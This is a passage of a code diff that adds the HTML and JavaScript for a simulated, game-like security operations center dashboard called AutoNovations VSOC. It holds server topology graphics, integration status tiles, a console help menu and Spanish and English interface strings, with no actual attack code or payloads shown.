+                                    <span class="text-emerald-500 font-bold">15%</span>
+                                </div>
+                                <div class="w-full h-1.5 bg-slate-900 rounded-full overflow-hidden">
+                                    <div class="h-full bg-emerald-500 rounded-full progress-bar-fill" style="width: 15%"></div>
+                                </div>
+                            </div>
+                            <!-- Lateral Movement (Blue) -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-[11px]">
+                                    <span class="text-slate-300 font-bold">Movimiento Lateral</span>
+                                    <span class="text-blue-500 font-bold">10%</span>
+                                </div>
+                                <div class="w-full h-1.5 bg-slate-900 rounded-full overflow-hidden">
+                                    <div class="h-full bg-blue-500 rounded-full progress-bar-fill" style="width: 10%"></div>
+                                </div>
+                            </div>
+                            <!-- Others (Purple) -->
+                            <div class="space-y-1">
+                                <div class="flex justify-between text-[11px]">
+                                    <span class="text-slate-300 font-bold">Otros</span>
+                                    <span class="text-purple-400 font-bold">7%</span>
+                                </div>
+                                <div class="w-full h-1.5 bg-slate-900 rounded-full overflow-hidden">
+                                    <div class="h-full bg-purple-500 rounded-full progress-bar-fill" style="width: 7%"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="mt-3 pt-3 border-t border-slate-900 flex justify-start">
+                            <button onclick="switchTab('reportes')" class="text-blue-400 hover:text-blue-300 font-semibold text-xs flex items-center gap-1 group" id="lbl-view-all-reports">
+                                Ver reporte completo 
+                                <i data-lucide="arrow-right" class="w-4 h-4 transition-transform group-hover:translate-x-1"></i>
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Incidentes Activos (4 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-4 flex flex-col h-[340px]">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase">
+                                <i data-lucide="shield-alert" class="w-4 h-4"></i>
+                                <span id="lbl-active-incidents-title">Incidentes Activos</span>
+                            </h3>
+                            <span class="text-[9px] font-mono text-slate-500" id="lbl-click-remediate">Remediar al hacer click</span>
+                        </div>
+                        <div class="flex-grow overflow-y-auto space-y-2 pr-1" id="active-incidents-list">
+                            <!-- Populated dynamically based on compromised servers and static mocks -->
+                        </div>
+                        <div class="mt-3 pt-3 border-t border-slate-900 flex justify-start">
+                            <button onclick="switchTab('incidentes')" class="text-blue-400 hover:text-blue-300 font-semibold text-xs flex items-center gap-1 group" id="lbl-view-all-incidents">
+                                Ver todos los incidentes 
+                                <i data-lucide="arrow-right" class="w-4 h-4 transition-transform group-hover:translate-x-1"></i>
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Content Grid Row 3 (Integrations + News) -->
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                    <!-- Integraciones y Fuentes de Datos (7 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-7 flex flex-col">
+                        <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase mb-4">
+                            <i data-lucide="webhook" class="w-4 h-4"></i>
+                            <span id="lbl-integrations-title">Integraciones y Fuentes de Datos</span>
+                        </h3>
+                        <div class="grid grid-cols-2 md:grid-cols-3 xl:grid-cols-6 gap-3 text-xs font-mono">
+                            <!-- SIEM -->
+                            <div class="p-3 bg-slate-950/60 border border-slate-900 rounded-xl flex items-center gap-3 hover:border-slate-850 transition-colors">
+                                <i data-lucide="file-code" class="w-6 h-6 text-slate-400"></i>
+                                <div>
+                                    <div class="font-bold text-white leading-none">SIEM</div>
+                                    <div class="text-[9px] text-emerald-400 flex items-center gap-1 mt-1 font-semibold leading-none">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block" id="status-siem-dot"></span>
+                                        <span id="status-siem-lbl">Conectado</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- EDR -->
+                            <div class="p-3 bg-slate-950/60 border border-slate-900 rounded-xl flex items-center gap-3 hover:border-slate-850 transition-colors">
+                                <i data-lucide="shield-check" class="w-6 h-6 text-slate-400"></i>
+                                <div>
+                                    <div class="font-bold text-white leading-none">EDR</div>
+                                    <div class="text-[9px] text-emerald-400 flex items-center gap-1 mt-1 font-semibold leading-none">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block" id="status-edr-dot"></span>
+                                        <span id="status-edr-lbl">Conectado</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Firewall -->
+                            <div class="p-3 bg-slate-950/60 border border-slate-900 rounded-xl flex items-center gap-3 hover:border-slate-850 transition-colors">
+                                <i data-lucide="network" class="w-6 h-6 text-slate-400"></i>
+                                <div>
+                                    <div class="font-bold text-white leading-none">Firewall</div>
+                                    <div class="text-[9px] text-emerald-400 flex items-center gap-1 mt-1 font-semibold leading-none">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block" id="status-fw-dot"></span>
+                                        <span id="status-fw-lbl">Conectado</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- IDS/IPS -->
+                            <div class="p-3 bg-slate-950/60 border border-slate-900 rounded-xl flex items-center gap-3 hover:border-slate-850 transition-colors">
+                                <i data-lucide="eye" class="w-6 h-6 text-slate-400"></i>
+                                <div>
+                                    <div class="font-bold text-white leading-none">IDS/IPS</div>
+                                    <div class="text-[9px] text-emerald-400 flex items-center gap-1 mt-1 font-semibold leading-none">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block" id="status-ids-dot"></span>
+                                        <span id="status-ids-lbl">Conectado</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Threat Intel -->
+                            <div class="p-3 bg-slate-950/60 border border-slate-900 rounded-xl flex items-center gap-3 hover:border-slate-850 transition-colors">
+                                <i data-lucide="globe-2" class="w-6 h-6 text-slate-400"></i>
+                                <div>
+                                    <div class="font-bold text-white leading-none">Threat Intel</div>
+                                    <div class="text-[9px] text-emerald-400 flex items-center gap-1 mt-1 font-semibold leading-none">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block" id="status-intel-dot"></span>
+                                        <span id="status-intel-lbl">Conectado</span>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- Cloud -->
+                            <div class="p-3 bg-slate-950/60 border border-slate-900 rounded-xl flex items-center gap-3 hover:border-slate-850 transition-colors">
+                                <i data-lucide="cloud" class="w-6 h-6 text-slate-400"></i>
+                                <div>
+                                    <div class="font-bold text-white leading-none">Cloud</div>
+                                    <div class="text-[9px] text-emerald-400 flex items-center gap-1 mt-1 font-semibold leading-none">
+                                        <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 inline-block" id="status-cloud-dot"></span>
+                                        <span id="status-cloud-lbl">Conectado</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Noticias de Seguridad (5 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-5 flex flex-col justify-between">
+                        <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase mb-4">
+                            <i data-lucide="newspaper" class="w-4 h-4"></i>
+                            <span id="lbl-news-title">Noticias de Seguridad</span>
+                        </h3>
+                        <div class="space-y-4 text-xs font-mono" id="news-container">
+                            <!-- News 1 -->
+                            <div class="flex items-start justify-between gap-4 pb-3 border-b border-slate-900/60">
+                                <div class="space-y-1">
+                                    <span class="text-slate-500 text-[10px]">20/05/2024 13:15</span>
+                                    <h4 class="font-semibold text-slate-200 hover:text-blue-400 transition-colors cursor-pointer" onclick="showNewsPopup(1)">Nueva campaña de phishing apunta a usuarios de Microsoft 365</h4>
+                                </div>
+                                <button onclick="showNewsPopup(1)" class="text-blue-400 hover:underline shrink-0" id="lbl-news-read-1">Leer más</button>
+                            </div>
+                            <!-- News 2 -->
+                            <div class="flex items-start justify-between gap-4">
+                                <div class="space-y-1">
+                                    <span class="text-slate-500 text-[10px]">20/05/2024 11:42</span>
+                                    <h4 class="font-semibold text-slate-200 hover:text-blue-400 transition-colors cursor-pointer" onclick="showNewsPopup(2)">Vulnerabilidad crítica en productos de VMware</h4>
+                                </div>
+                                <button onclick="showNewsPopup(2)" class="text-blue-400 hover:underline shrink-0" id="lbl-news-read-2">Leer más</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- VIEW: MONITOREO DE NODOS (TOPOLOGY & DIAGNOSTICS) -->
+            <div id="view-monitoreo-container" class="space-y-6 hidden">
+                <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                    <!-- Topology Card (7 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-7 flex flex-col h-[520px]">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase">
+                                <i data-lucide="network" class="w-4 h-4"></i>
+                                <span id="lbl-topology-title">Topología de Servidores</span>
+                            </h3>
+                            <span class="text-slate-500 text-[10px] font-mono" id="lbl-click-node">Click en nodo para telemetría</span>
+                        </div>
+
+                        <!-- Node Status Summary Grid -->
+                        <div class="grid grid-cols-5 gap-2 mb-4 text-center font-mono text-[10px]">
+                            <div class="p-2 rounded bg-slate-950/60 border border-slate-900">
+                                <div class="text-slate-500" id="lbl-node-total">NODOS</div>
+                                <div class="font-bold text-white text-sm mt-1">5</div>
+                            </div>
+                            <div class="p-2 rounded bg-slate-950/60 border border-slate-900">
+                                <div class="text-emerald-400" id="lbl-node-secure">SEGURO</div>
+                                <div class="font-bold text-emerald-400 text-sm mt-1" id="summary-secure-count">5</div>
+                            </div>
+                            <div class="p-2 rounded bg-slate-950/60 border border-slate-900">
+                                <div class="text-blue-400" id="lbl-node-shield">ESCUDO</div>
+                                <div class="font-bold text-blue-400 text-sm mt-1 animate-pulse" id="summary-shield-count">0</div>
+                            </div>
+                            <div class="p-2 rounded bg-slate-950/60 border border-slate-900">
+                                <div class="text-red-500" id="lbl-node-threat">ALERTAS</div>
+                                <div class="font-bold text-red-500 text-sm mt-1 animate-pulse" id="summary-alert-count">0</div>
+                            </div>
+                            <div class="p-2 rounded bg-slate-950/60 border border-slate-900">
+                                <div class="text-orange-500 font-semibold" id="lbl-node-load">CPU MED</div>
+                                <div class="font-bold text-orange-500 text-sm mt-1" id="summary-avg-load">12%</div>
+                            </div>
+                        </div>
+
+                        <!-- SVG Interactive Node Map -->
+                        <div class="flex-grow flex items-center justify-center bg-slate-950/40 rounded-xl border border-slate-900 p-4 relative">
+                            <svg viewBox="0 0 300 300" class="w-full h-full max-w-[340px]">
+                                <!-- Connecting Grid Lines -->
+                                <g stroke="rgba(59, 130, 246, 0.12)" stroke-width="1.5">
+                                    <!-- Radar concentric circles -->
+                                    <circle cx="150" cy="150" r="110" fill="none" stroke-dasharray="4 8" />
+                                    <circle cx="150" cy="150" r="60" fill="none" stroke-dasharray="2 4" />
+                                    
+                                    <!-- Star connections -->
+                                    <line x1="150" y1="150" x2="150" y2="40" class="node-link" id="link-api" />
+                                    <line x1="150" y1="150" x2="60" y2="110" class="node-link" id="link-auth" />
+                                    <line x1="150" y1="150" x2="240" y2="110" class="node-link" id="link-app" />
+                                    <line x1="150" y1="150" x2="90" y2="230" class="node-link" id="link-db" />
+                                    <line x1="150" y1="150" x2="210" y2="230" class="node-link" id="link-backup" />
+                                </g>
+
+                                <!-- Central Firewall Router Node -->
+                                <g class="cursor-pointer" onclick="selectNode('firewall')">
+                                    <circle cx="150" cy="150" r="22" fill="#0d1222" stroke="#00f0ff" stroke-width="2" />
+                                    <circle cx="150" cy="150" r="16" fill="rgba(0, 240, 255, 0.08)" />
+                                    <text x="150" y="153" font-family="Orbitron" font-size="7" fill="#00f0ff" text-anchor="middle" font-weight="bold">FW-CORE</text>
+                                </g>
+
+                                <!-- Node: API Gateway -->
+                                <g class="cursor-pointer group" onclick="selectNode('api')">
+                                    <circle cx="150" cy="40" r="16" fill="#0d1222" stroke="#22c55e" stroke-width="2" id="node-api" />
+                                    <circle cx="150" cy="40" r="22" fill="none" stroke="#00f0ff" stroke-width="1" stroke-dasharray="3 3" class="animate-spin" style="animation-duration: 12s;" id="shield-api" opacity="0" />
+                                    <text x="150" y="18" font-family="monospace" font-size="8" fill="#cbd5e1" text-anchor="middle">API</text>
+                                    <circle cx="150" cy="40" r="3" fill="#22c55e" id="status-api" />
+                                </g>
+
+                                <!-- Node: Auth Server -->
+                                <g class="cursor-pointer group" onclick="selectNode('auth')">
+                                    <circle cx="60" cy="110" r="16" fill="#0d1222" stroke="#22c55e" stroke-width="2" id="node-auth" />
+                                    <circle cx="60" cy="110" r="22" fill="none" stroke="#00f0ff" stroke-width="1" stroke-dasharray="3 3" class="animate-spin" style="animation-duration: 12s;" id="shield-auth" opacity="0" />
+                                    <text x="60" y="88" font-family="monospace" font-size="8" fill="#cbd5e1" text-anchor="middle">AUTH</text>
+                                    <circle cx="60" cy="110" r="3" fill="#22c55e" id="status-auth" />
+                                </g>
+
+                                <!-- Node: App Node -->
+                                <g class="cursor-pointer group" onclick="selectNode('app')">
+                                    <circle cx="240" cy="110" r="16" fill="#0d1222" stroke="#22c55e" stroke-width="2" id="node-app" />
+                                    <circle cx="240" cy="110" r="22" fill="none" stroke="#00f0ff" stroke-width="1" stroke-dasharray="3 3" class="animate-spin" style="animation-duration: 12s;" id="shield-app" opacity="0" />
+                                    <text x="240" y="88" font-family="monospace" font-size="8" fill="#cbd5e1" text-anchor="middle">APP</text>
+                                    <circle cx="240" cy="110" r="3" fill="#22c55e" id="status-app" />
+                                </g>
+
+                                <!-- Node: Database -->
+                                <g class="cursor-pointer group" onclick="selectNode('db')">
+                                    <circle cx="90" cy="230" r="16" fill="#0d1222" stroke="#22c55e" stroke-width="2" id="node-db" />
+                                    <circle cx="90" cy="230" r="22" fill="none" stroke="#00f0ff" stroke-width="1" stroke-dasharray="3 3" class="animate-spin" style="animation-duration: 12s;" id="shield-db" opacity="0" />
+                                    <text x="90" y="254" font-family="monospace" font-size="8" fill="#cbd5e1" text-anchor="middle">DB-SQL</text>
+                                    <circle cx="90" cy="230" r="3" fill="#22c55e" id="status-db" />
+                                </g>
+
+                                <!-- Node: Backup Vault -->
+                                <g class="cursor-pointer group" onclick="selectNode('backup')">
+                                    <circle cx="210" cy="230" r="16" fill="#0d1222" stroke="#22c55e" stroke-width="2" id="node-backup" />
+                                    <circle cx="210" cy="230" r="22" fill="none" stroke="#00f0ff" stroke-width="1" stroke-dasharray="3 3" class="animate-spin" style="animation-duration: 12s;" id="shield-backup" opacity="0" />
+                                    <text x="210" y="254" font-family="monospace" font-size="8" fill="#cbd5e1" text-anchor="middle">VAULT</text>
+                                    <circle cx="210" cy="230" r="3" fill="#22c55e" id="status-backup" />
+                                </g>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <!-- Diagnostics Card (5 cols) -->
+                    <div class="glass-card p-5 rounded-2xl lg:col-span-5 flex flex-col h-[520px] justify-between">
+                        <div>
+                            <h3 class="font-tech text-xs tracking-wider text-blue-400 flex items-center gap-2 uppercase mb-4">
+                                <i data-lucide="stethoscope" class="w-4 h-4"></i>
+                                <span id="lbl-diag-title">Telemetría de Servidores</span>
+                            </h3>
+                            
+                            <!-- Diagnostic view placeholder -->
+                            <div class="text-slate-500 text-xs text-center font-mono border border-slate-900/60 p-6 rounded-xl bg-slate-950/20" id="diag-empty-placeholder">
+                                <i data-lucide="info" class="w-6 h-6 inline-block mb-2 text-blue-400"></i>
+                                <p id="lbl-diag-placeholder">Haz clic en cualquier nodo del diagrama de topología de la izquierda para ver su telemetría y aplicar acciones preventivas o correctivas en tiempo real.</p>
+                            </div>
+
+                            <!-- Diagnostic Details Panel -->
+                            <div class="p-5 bg-slate-950/60 border border-slate-900 rounded-xl font-mono text-xs hidden" id="diag-panel">
+                                <div class="flex justify-between items-center border-b border-slate-900 pb-3 mb-3">
+                                    <span class="text-blue-400 font-bold uppercase text-sm" id="diag-name">API GATEWAY</span>
+                                    <span class="text-slate-500 font-bold" id="diag-ip">10.0.0.1</span>
+                                </div>
+                                <div class="grid grid-cols-2 gap-y-3 gap-x-4 text-xs mb-4 text-slate-400">
+                                    <div><span id="lbl-diag-status">Estado:</span> <span class="font-bold text-emerald-400" id="diag-status">SEGURO</span></div>
+                                    <div><span id="lbl-diag-ping">Ping:</span> <span class="font-bold text-slate-200" id="diag-ping">12ms</span></div>
+                                    <div><span id="lbl-diag-cpu">Uso CPU:</span> <span class="font-bold text-orange-500" id="diag-cpu">15%</span></div>
+                                    <div><span id="lbl-diag-os">Sistema:</span> <span class="font-bold text-slate-200" id="diag-os">ROS2-Edge v3</span></div>
+                                </div>
+                                <div class="h-px bg-slate-900 my-4"></div>
+                                <!-- Actions for selected Node -->
+                                <div class="flex flex-col sm:flex-row gap-2">
+                                    <button onclick="actionShieldSelected()" class="flex-1 py-2 px-3 rounded-lg bg-blue-500/10 border border-blue-500/30 text-blue-400 text-[10px] font-bold hover:bg-blue-500 hover:text-white transition-all text-center uppercase tracking-wide" id="btn-diag-shield">
+                                        Activar Escudo
+                                    </button>
+                                    <button onclick="actionRebootSelected()" class="flex-1 py-2 px-3 rounded-lg bg-orange-500/10 border border-orange-500/30 text-orange-400 text-[10px] font-bold hover:bg-orange-500 hover:text-white transition-all text-center uppercase tracking-wide" id="btn-diag-reboot">
+                                        Reiniciar Nodo
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- System Security Integrity Box -->
+                        <div class="p-4 bg-slate-950/60 border border-slate-900 rounded-xl flex items-center justify-between font-mono text-xs">
+                            <div class="space-y-1">
+                                <span class="text-slate-500 text-[10px]" id="lbl-system-integrity">INTEGRIDAD GLOBAL</span>
+                                <div class="text-base font-bold font-tech text-emerald-400" id="integrity-value">100.0%</div>
+                            </div>
+                            <div class="space-y-1 text-right">
+                                <span class="text-slate-500 text-[10px]" id="lbl-defcon-state">ESTADO DEFCON</span>
+                                <div class="text-xs font-bold font-tech text-blue-400" id="defcon-value">DEFCON 4</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- VIEW: CONSOLA DE COMANDOS (TERMINAL) -->
+            <div id="view-configuracion-container" class="space-y-6 hidden">
+                <div class="glass-card p-5 rounded-2xl flex flex-col h-[520px]">
+                    <div class="flex justify-between items-center border-b border-slate-900 pb-3 mb-4">
+                        <div class="flex items-center gap-2">
+                            <div class="flex gap-1.5">
+                                <span class="w-2.5 h-2.5 rounded-full bg-red-500/80"></span>
+                                <span class="w-2.5 h-2.5 rounded-full bg-yellow-500/80"></span>
+                                <span class="w-2.5 h-2.5 rounded-full bg-emerald-500/80"></span>
+                            </div>
+                            <span class="font-tech text-[10px] uppercase tracking-wider text-slate-300 pl-2">CONSOLE_CORE_v4.8</span>
+                        </div>
+                        <div class="font-mono text-[10px] text-slate-500">
+                            <span class="text-blue-400">SEC_OS</span>@Autonovations
+                        </div>
+                    </div>
+
+                    <!-- Console screen -->
+                    <div class="flex-grow bg-slate-950/90 border border-slate-900 rounded-xl p-4 overflow-y-auto font-mono text-[11px] text-emerald-500 flex flex-col" id="console-screen">
+                        <div class="text-slate-600 mb-1.5" id="console-init-text">Inicializando Consola de Defensa Autonovations...</div>
+                        <div id="console-output" class="space-y-1"></div>
+                        <!-- Typing prompt -->
+                        <div class="flex items-center mt-auto pt-2 border-t border-slate-900/40">
+                            <span class="text-blue-400 mr-2 shrink-0">op@vsoc:~$</span>
+                            <input type="text" id="console-input" class="bg-transparent border-none outline-none text-slate-200 w-full font-mono text-[11px]" autocomplete="off" autofocus />
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- VIEW: MODULE UNDER DEVELOPMENT (PLACEHOLDER) -->
+            <div id="view-placeholder-container" class="space-y-6 hidden">
+                <div class="glass-card p-12 rounded-2xl flex flex-col justify-center items-center text-center max-w-lg mx-auto h-[400px]">
+                    <div class="w-16 h-16 rounded-full bg-slate-900 border border-slate-800 flex items-center justify-center mb-6">
+                        <i data-lucide="cone" class="w-8 h-8 text-blue-400 animate-bounce"></i>
+                    </div>
+                    <h3 class="font-tech font-bold text-lg text-white mb-2" id="lbl-placeholder-title">Módulo en desarrollo</h3>
+                    <p class="text-xs text-slate-400 leading-relaxed max-w-sm mb-6" id="lbl-placeholder-desc">Esta sección se encuentra en desarrollo activo para la versión corporativa de AutoNovations VSOC.</p>
+                    <button onclick="switchTab('general')" class="px-5 py-2 rounded-lg bg-blue-600 text-white font-semibold text-xs hover:bg-blue-500 transition-colors" id="btn-placeholder-back">Volver a Vista General</button>
+                </div>
+            </div>
+
+        </main>
+
+        <!-- FOOTER -->
+        <footer class="border-t border-slate-900/60 bg-[#05070c]/80 backdrop-blur-md py-3 px-8 text-slate-500 text-[10px] font-mono shrink-0">
+            <div class="flex flex-col md:flex-row justify-between items-center gap-2">
+                <div>&copy; 2026 AutoNovations VSOC Core. All Rights Reserved.</div>
+                <div class="text-[10px] text-blue-500/80"><span id="lbl-status-mesh">RED DE INTEGRIDAD MESH GLOBAL: ESTABLE</span> | <span id="telemetry-ping">PING: 14ms</span></div>
+            </div>
+        </footer>
+    </div>
+
+    <!-- CODE LOGIC -->
+    <script>
+        // --- TRANSLATION DATA ---
+        const vsocTranslations = {
+            es: {
+                title: "AutoNovations | Virtual Security Operations Center (VSOC)",
+                lblStatus: "Analista En línea",
+                lblDefcon: "ESTADO DEFCON",
+                lblIntegrity: "INTEGRIDAD GLOBAL",
+                btnMock: "Simular Intrusión",
+                lblTopologyTitle: "Topología de Servidores",
+                lblClickNode: "Click en nodo para telemetría",
+                lblNodeTotal: "NODOS",
+                lblNodeSecure: "SEGURO",
+                lblNodeShield: "ESCUDO",
+                lblNodeThreat: "ALERTAS",
+                lblNodeLoad: "CPU MED",
+                lblDiagStatus: "Estado:",
+                lblDiagPing: "Ping:",
+                lblDiagCpu: "Uso CPU:",
+                lblDiagOs: "Sistema:",
+                btnDiagShield: "Activar Escudo",
+                btnDiagReboot: "Reiniciar Nodo",
+                lblDiagPlaceholder: "Haz clic en cualquier nodo del diagrama de topología de la izquierda para ver su telemetría y aplicar acciones preventivas o correctivas en tiempo real.",
+                lblMapTitle: "Mapa de Amenazas en Tiempo Real",
+                lblLiveRadar: "Radar Vivo",
+                lblLogsTitle: "Eventos de Seguridad",
+                lblClickLog: "Click log para forense",
+                lblStatusMesh: "RED DE INTEGRIDAD MESH GLOBAL: ESTABLE",
+                consoleInit: "Inicializando Consola de Defensa Autonovations... Escribe 'help' para ver la lista de comandos disponibles.",
+                defconCriticalTitle: "¡ALERTA DE INTROMISIÓN MÁXIMA!",
+                defconCriticalText: "¡Múltiples servidores han sido comprometidos! El score de seguridad ha descendido críticamente. Despliega escudos o reinicia los nodos afectados.",
+                defconSafeTitle: "Sistema Asegurado",
+                defconSafeText: "Todos los servidores están operando de forma óptima bajo protección activa.",
+                diagFirewallTitle: "Sistema de Cortafuegos Principal (Firewall)",
+                diagFirewallDesc: "Controlador perimetral de paquetes. Bloquea peticiones de IP maliciosas y filtra telemetría.",
+                shieldSuccessTitle: "Escudo Desplegado",
+                shieldSuccessText: "El servidor {name} se encuentra ahora blindado con cifrado de flujo cuántico. Inmune a ataques simulados.",
+                rebootSuccessTitle: "Reinicio Completado",
+                rebootSuccessText: "El nodo {name} ha purgado su caché y archivos de registro. El malware ha sido eliminado y la integridad se ha restaurado.",
+                alreadyShielded: "El nodo {name} ya tiene un escudo activo.",
+                notCompromised: "El nodo {name} no requiere reinicio, ya está seguro.",
+                forensicTitle: "Análisis Forense de Amenaza",
+                forensicDetails: "<b>Origen IP:</b> {ip}<br><b>Objetivo:</b> {node}<br><b>Tipo:</b> {type}<br><b>Severidad:</b> <span class='text-red-500 font-bold'>{severity}</span><br><b>Payload:</b> <span class='font-mono bg-slate-950 p-2 text-blue-400 rounded-lg block mt-2 text-[10px] overflow-x-auto border border-slate-900'>{payload}</span>",
+                forensicConfirm: "Bloquear IP",
+                forensicCancel: "Cerrar",
+                ipBlockedSuccess: "La IP {ip} ha sido ingresada a la lista negra del cortafuegos perimetral.",
+                alertSystemUnderAttack: "¡Intrusión en progreso! El nodo {name} está siendo atacado.",
+                helpMenu: "<b>Comandos de Consola Disponibles:</b><br>" +
+                           "- <span class='text-blue-400'>help</span>: Muestra esta guía de ayuda.<br>" +
+                           "- <span class='text-blue-400'>status</span>: Imprime el estado detallado de todos los servidores.<br>" +
+                           "- <span class='text-blue-400'>scan</span>: Realiza un análisis de vulnerabilidades a nivel de red.<br>" +
+                           "- <span class='text-blue-400'>shield [nodo]</span>: Activa el blindaje en un nodo específico (api, auth, app, db, backup).<br>" +
+                           "- <span class='text-blue-400'>reboot [nodo]</span>: Reinicia un nodo comprometido para limpiarlo.<br>" +
+                           "- <span class='text-blue-400'>block [ip]</span>: Bloquea manualmente una dirección IP sospechosa.<br>" +
+                           "- <span class='text-blue-400'>simulate</span>: Lanza una simulación aleatoria de ataque externo.<br>" +
+                           "- <span class='text-blue-400'>matrix</span>: Activa o desactiva el fondo de lluvia de código digital.<br>" +
+                           "- <span class='text-blue-400'>clear</span>: Limpia la pantalla de la terminal.",
+                
+                // Redesign additions
+                lblRecentAlerts: "Alertas Recientes",
+                lblTopThreats: "Top Amenazas Detectadas",
+                lblActiveIncidents: "Incidentes Activos",
+                lblDataIntegrations: "Integraciones y Fuentes de Datos",
+                lblSecurityNews: "Noticias de Seguridad",
+                lblTotalAlertsCard: "Alertas Totales",
+                lblCriticalAlertsCard: "Alertas Críticas",
+                lblHighAlertsCard: "Alertas Altas",
+                lblActiveIncidentsCard: "Incidentes Activos",
+                lblMonitoredAssetsCard: "Activos Monitoreados",
+                lblMonitoredUsersCard: "Usuarios Monitoreados",
+                lblCollapseMenu: "Colapsar menú",
+                lblUnderDevelopment: "Módulo en desarrollo",
+                lblDevelopmentText: "Esta sección se encuentra en desarrollo activo para la versión corporativa de AutoNovations VSOC.",
+                lblBackToOverview: "Volver a Vista General",
+                lblShift: "Turno: NOC - Tarde",
+                lblActiveAnalyst: "Analista En línea",
+                lblClickForensics: "Click en fila para forense",
+                lblClickRemediate: "Remediar al hacer click",
+                lblIntegrationsTitle: "Integraciones y Fuentes de Datos",
+                lblNewsTitle: "Noticias de Seguridad",
+                lblNewsRead: "Leer más",
+                lblDoughnutTitle: "Alertas por Severidad",
+                lblTrendTitle: "Tendencia de Alertas",
+                lblDiagTitle: "Telemetría de Servidores",
+                lblDiagPlaceholder: "Haz clic en cualquier nodo del diagrama de topología de la izquierda para ver su telemetría y aplicar acciones preventivas o correctivas en tiempo real."
+            },
+            en: {
+                title: "AutoNovations | Virtual Security Operations Center (VSOC)",
+                lblStatus: "Analyst Online",
+                lblDefcon: "DEFCON STATE",
+                lblIntegrity: "GLOBAL INTEGRITY",
+                btnMock: "Simulate Intrusion",
+                lblTopologyTitle: "Server Topology",
+                lblClickNode: "Click node for telemetry",
+                lblNodeTotal: "NODES",
+                lblNodeSecure: "SECURE",
+                lblNodeShield: "SHIELD",
+                lblNodeThreat: "ALERTS",
+                lblNodeLoad: "AVG CPU",
+                lblDiagStatus: "Status:",
+                lblDiagPing: "Ping:",
+                lblDiagCpu: "CPU Load:",
+                lblDiagOs: "System:",
+                btnDiagShield: "Deploy Shield",
+                btnDiagReboot: "Reboot Node",
+                lblDiagPlaceholder: "Click on any node in the topology diagram on the left to view its telemetry and apply preventative or corrective actions in real time.",
+                lblMapTitle: "Real-time Cyber Attack Map",
+                lblLiveRadar: "Live Radar",
+                lblLogsTitle: "Security Events",
+                lblClickLog: "Click log for forensics",
+                lblStatusMesh: "GLOBAL INTEGRITY MESH NET: STABLE",
+                consoleInit: "Initializing Autonovations Defense Console... Type 'help' to see the list of available commands.",
+                defconCriticalTitle: "CRITICAL BREACH WARNING!",
+                defconCriticalText: "Multiple servers have been compromised! Security integrity score has dropped critically. Deploy shields or reboot infected nodes.",
+                defconSafeTitle: "System Secured",
+                defconSafeText: "All servers are operating optimally under active system protection.",
+                diagFirewallTitle: "Main Firewall Core System",
+                diagFirewallDesc: "Perimeter packet controller. Blocks malicious IP requests and filters system telemetry.",
+                shieldSuccessTitle: "Shield Deployed",
+                shieldSuccessText: "Server {name} is now protected with quantum stream encryption. Immune to simulated attacks.",
+                rebootSuccessTitle: "Reboot Completed",
+                rebootSuccessText: "Node {name} has purged its cache memory and logs. Malware payload removed and integrity restored.",
+                alreadyShielded: "Node {name} already has an active shield.",
+                notCompromised: "Node {name} doesn't need to reboot, it is already secure.",
+                forensicTitle: "Forensic Threat Analysis",
+                forensicDetails: "<b>Source IP:</b> {ip}<br><b>Target:</b> {node}<br><b>Type:</b> {type}<br><b>Severity:</b> <span class='text-red-500 font-bold'>{severity}</span><br><b>Payload:</b> <span class='font-mono bg-slate-950 p-2 text-blue-400 rounded-lg block mt-2 text-[10px] overflow-x-auto border border-slate-900'>{payload}</span>",
+                forensicConfirm: "Block IP",
+                forensicCancel: "Close",
+                ipBlockedSuccess: "IP address {ip} has been registered in the perimeter firewall block list.",
+                alertSystemUnderAttack: "Breach in progress! Node {name} is under attack.",
+                helpMenu: "<b>Available Console Commands:</b><br>" +
+                           "- <span class='text-blue-400'>help</span>: Show this help command manual.<br>" +
+                           "- <span class='text-blue-400'>status</span>: Prints full diagnostics report of all servers.<br>" +
+                           "- <span class='text-blue-400'>scan</span>: Performs a deep security vulnerability analysis.<br>" +
+                           "- <span class='text-blue-400'>shield [node]</span>: Arm defenses on a specific server node (api, auth, app, db, backup).<br>" +
+                           "- <span class='text-blue-400'>reboot [node]</span>: Reboots a compromised server to purge threats.<br>" +
+                           "- <span class='text-blue-400'>block [ip]</span>: Add IP address manually to firewall blacklist.<br>" +
+                           "- <span class='text-blue-400'>simulate</span>: Triggers a mock external cyber attack sequence.<br>" +
